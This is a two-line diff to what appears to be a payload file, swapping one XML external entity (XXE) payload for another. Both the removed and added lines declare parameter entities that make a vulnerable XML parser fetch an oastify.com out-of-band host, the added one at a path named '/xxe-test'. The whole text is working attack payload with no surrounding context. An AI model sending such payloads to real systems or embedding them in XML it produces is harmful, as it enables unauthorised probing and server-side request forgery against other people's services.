@@ -1,1 +1,2 @@
-<!DOCTYPE x [<!ENTITY % ssrf SYSTEM "http://n7vvtq2wardov2j9yz34f2dydpjh77vw.oastify.com/">%ssrf;]>
+<!ENTITY % test SYSTEM "http://0fg813a9i4l13frm6cbhnflbl2rufq3f.oastify.com/xxe-test">
+%test;
